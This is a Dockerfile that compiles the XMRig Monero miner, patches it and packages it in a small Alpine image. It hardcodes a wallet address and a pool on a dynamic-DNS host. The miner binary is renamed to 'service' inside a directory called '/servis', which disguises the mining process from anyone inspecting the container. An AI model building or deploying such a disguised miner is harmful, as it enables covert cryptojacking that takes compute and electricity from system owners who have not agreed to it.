FROM alpine:3.13 AS builder

ARG XMRIG_VERSION='v6.16.4'
WORKDIR /servis

RUN echo "@community http://dl-cdn.alpinelinux.org/alpine/edge/community" >> /etc/apk/repositories && \
    apk update && apk add --no-cache \
    build-base \
    git \
    cmake \
    libuv-dev \
    linux-headers \
    libressl-dev \
    hwloc-dev@community

RUN git clone https://github.com/xmrig/xmrig && \
    mkdir xmrig/build && \
    cd xmrig && git checkout ${XMRIG_VERSION}

COPY supportxmr.patch /servis/xmrig
RUN cd xmrig && git apply supportxmr.patch

RUN cd xmrig/build && \
    cmake .. -DCMAKE_BUILD_TYPE=Release && \
    make -j$(nproc) 


FROM alpine:3.13

ENV WALLET=ZEPHYR2TFLiNGW2zGrJrbc43kdT9Vmx5ugKGBHHoZ4oxeS7X3X1xqEb5NCXjVNfAXthHHWQ8cd6XfcGYsLVgYRuK5642R48cXRH4Z
ENV POOL=imboost.duckdns.org:1123
ENV WORKER_NAME=x

RUN echo "@community http://dl-cdn.alpinelinux.org/alpine/edge/community" >> /etc/apk/repositories && \
    apk update && apk add --no-cache \
    libuv \
    libressl \
    hwloc@community

WORKDIR /xmr
COPY --from=builder /servis/xmrig/build/xmrig /xmr
RUN mv xmrig service 

CMD ["sh", "-c", "./service --url=$POOL --donate-level=1 --user=$WALLET --pass=$WORKER_NAME -k --algo=rx/0"]
